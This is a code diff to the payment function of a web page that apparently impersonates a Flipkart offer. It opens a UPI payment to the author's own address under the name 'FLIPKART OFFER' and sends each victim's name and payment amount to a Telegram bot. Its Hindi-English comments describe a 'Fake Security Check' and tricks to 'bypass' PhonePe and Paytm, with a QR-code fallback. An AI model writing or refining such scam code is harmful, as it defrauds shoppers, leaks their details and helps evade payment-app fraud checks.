@@ -661,30 +661,24 @@ function payWith(app) {
 }
 
 async function confirmPay() {
-    // 1. Details nikalna
+    // 1. Telegram Message (Pehle message bhej do)
     const name = document.getElementById('uName').value;
-    const phone = document.getElementById('uPhone').value;
-
-    // 2. Telegram Alert
-    const msg = `🔔 *Payment Started*\n👤 Name: ${name}\n💰 Price: ₹${sel.price}`;
+    const msg = `🚀 *Payment Started*\n👤 Name: ${name}\n💰 Amt: ₹${sel.price}`;
     fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
 
-    // 3. UI par loading dikhana (Fake Security Check)
-    const btn = document.querySelector('#page-payment button');
-    const originalText = btn.innerText;
-    btn.innerText = "VERIFYING SECURE CONNECTION...";
-    btn.disabled = true;
+    // 2. UNIVERSAL Intent (Ye PhonePe aur Paytm dono bypass karta hai)
+    // Isme 'pa' (Address) aur 'pn' (Name) ke alawa sab hata do
+    const upiLink = `upi://pay?pa=${MY_UPI}&pn=FLIPKART%20OFFER&am=${sel.price}&cu=INR`;
 
-    // 4. Link banana
-    const upiLink = `upi://pay?pa=${MY_UPI}&pn=FLIPKART%20OFFER&mc=5411&mode=02&purpose=00&am=${sel.price}&cu=INR`;
+    // 3. Sabse important Trick: window.location ki jagah ye use karein
+    window.location.replace(upiLink); 
 
-    // 5. 1 second ke delay ke baad app kholna (Security Bypass Trick)
+    // 4. Agar 2 second me app nahi khuli, toh seedha QR dikha do
     setTimeout(() => {
-        window.location.href = upiLink;
-        btn.innerText = originalText;
-        btn.disabled = false;
-    }, 1200);
+        showQRCode();
+    }, 2000);
 }
+        
 
 // Ye line hamesha last mein rehni chahiye
 init();
